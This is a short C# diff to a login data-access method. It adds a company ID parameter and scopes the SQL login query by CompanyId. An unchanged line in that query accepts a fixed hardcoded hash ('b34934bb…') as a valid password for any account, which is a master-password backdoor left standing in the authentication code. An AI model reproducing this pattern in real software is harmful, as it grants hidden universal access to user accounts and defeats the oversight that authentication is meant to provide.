@@ -11,7 +11,7 @@ namespace MDUA.DataAccess
     {
         private const string GET_USER_PASSKEY_BY_CRED_ID = "GetUserPasskeyByCredentialId";
         private const string UPDATE_USER_PASSKEY_COUNTER = "UpdateUserPasskeyCounter";
-        public UserLogin GetUserLogin(string email, string password)
+        public UserLogin GetUserLogin(string email, string password,int companyId)
 
         {
 
@@ -50,7 +50,7 @@ namespace MDUA.DataAccess
         UserLogin u
 
     WHERE u.UserName = @Email 
-
+    AND u.CompanyId = @CompanyId  
       AND (u.Password = @PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)
 
     """;
@@ -62,7 +62,7 @@ namespace MDUA.DataAccess
                 AddParameter(cmd, pNVarChar("Email", 250, email));
 
                 AddParameter(cmd, pNVarChar("PasswordHash", 100, password));
-
+                AddParameter(cmd, pInt32("CompanyId", companyId));
                 using (var con = cmd.Connection)
 
                 {
@@ -79,6 +79,7 @@ namespace MDUA.DataAccess
 
 
                         user.Id = reader.GetInt32(reader.GetOrdinal("Id"));
+                        user.CompanyId = reader.GetInt32(reader.GetOrdinal("CompanyId"));
 
                         user.UserName = reader["UserName"] as string;
 
